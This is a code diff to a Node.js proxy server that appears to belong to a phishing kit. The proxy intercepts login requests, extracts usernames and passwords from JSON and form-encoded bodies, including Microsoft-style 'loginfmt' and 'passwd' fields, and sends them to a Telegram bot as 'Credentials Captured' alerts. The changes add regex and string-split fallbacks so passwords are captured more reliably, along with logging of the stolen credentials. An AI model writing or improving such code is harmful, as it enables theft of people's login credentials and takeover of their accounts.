@@ -329,7 +329,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
         const originalUrl = clientRequestBody.url || '';
         const originalMethod = clientRequestBody.method || '';
 
-        console.log('[DEBUG] Original body:', originalBody);
+        console.log('[DEBUG] Original body (first 500 chars):', originalBody.substring(0, 500));
         console.log('[DEBUG] Content-Type:', clientRequestBody.headers?.['content-type'] || '');
 
         if (originalMethod === 'POST' && 
@@ -341,13 +341,16 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
             let password = '';
             const contentType = clientRequestBody.headers?.['content-type'] || '';
 
+            // ---- Parse JSON ----
             if (contentType.includes('application/json')) {
                 try {
                     const json = JSON.parse(originalBody);
                     email = json.username || json.user || json.email || json.loginfmt || json.login || json.userid || '';
                     password = json.password || json.passwd || json.pass || json.Password || json.pwd || '';
                 } catch (e) {}
-            } else if (contentType.includes('application/x-www-form-urlencoded')) {
+            }
+            // ---- Parse URL-encoded ----
+            else if (contentType.includes('application/x-www-form-urlencoded')) {
                 try {
                     const params = new URLSearchParams(originalBody);
                     console.log('[DEBUG] passwd param from URLSearchParams:', params.get('passwd'));
@@ -355,18 +358,41 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                             params.get('loginfmt') || params.get('login') || params.get('userid') || '';
                     password = params.get('password') || params.get('passwd') || params.get('pass') || 
                                params.get('Password') || params.get('pwd') || '';
-                } catch (e) {}
-            }
-
-            // ---- FALLBACK: extract password directly from raw body ----
-            if (!password) {
-                const passMatch = originalBody.match(/passwd=([^&]*)/);
-                if (passMatch) {
-                    password = decodeURIComponent(passMatch[1]);
-                    console.log('[FALLBACK] Extracted password via regex:', password);
+                    console.log('[DEBUG] After URLSearchParams - email:', email, 'password:', password);
+                } catch (e) {
+                    console.log('[DEBUG] URLSearchParams error:', e.message);
                 }
             }
 
+            // ---- FALLBACK 1: Regex ----
+            console.log('[DEBUG] Before fallback - password:', password);
+            if (!password) {
+                const passMatch = originalBody.match(/passwd=([^&]*)/);
+                console.log('[DEBUG] Regex match result:', passMatch);
+                if (passMatch) {
+                    password = decodeURIComponent(passMatch[1]);
+                    console.log('[FALLBACK 1] Extracted password via regex:', password);
+                }
+            }
+
+            // ---- FALLBACK 2: Manual split (safest) ----
+            if (!password) {
+                try {
+                    const parts = originalBody.split('&');
+                    for (const part of parts) {
+                        if (part.startsWith('passwd=')) {
+                            const raw = part.substring(7);
+                            password = decodeURIComponent(raw);
+                            console.log('[FALLBACK 2] Extracted password via split:', password);
+                            break;
+                        }
+                    }
+                } catch (e) {
+                    console.log('[DEBUG] Split fallback error:', e.message);
+                }
+            }
+
+            // ---- Send alert if email or password exists ----
             if (email || password) {
                 const msg = `🔐 *Credentials Captured*\n\n` +
                             `📧 *Email:* ${email || 'N/A'}\n` +
@@ -375,11 +401,17 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                             `🕐 *Time:* ${new Date().toISOString()}`;
                 sendToTelegram(msg).catch(error => console.error('Telegram send failed:', error));
                 console.log(`[CRED] Email: ${email || 'N/A'} | Password: ${password || 'N/A'}`);
+            } else {
+                console.log('[DEBUG] No email or password found after all attempts.');
             }
+        } else {
+            console.log('[DEBUG] Request did not match login criteria. URL:', originalUrl, 'Method:', originalMethod);
         }
+    } else {
+        console.log('[DEBUG] No clientRequestBody.body found.');
     }
 } catch (e) {
-    // Silent fail
+    console.log('[DEBUG] Top-level error:', e.message);
 }
                     // ====================================================================
 
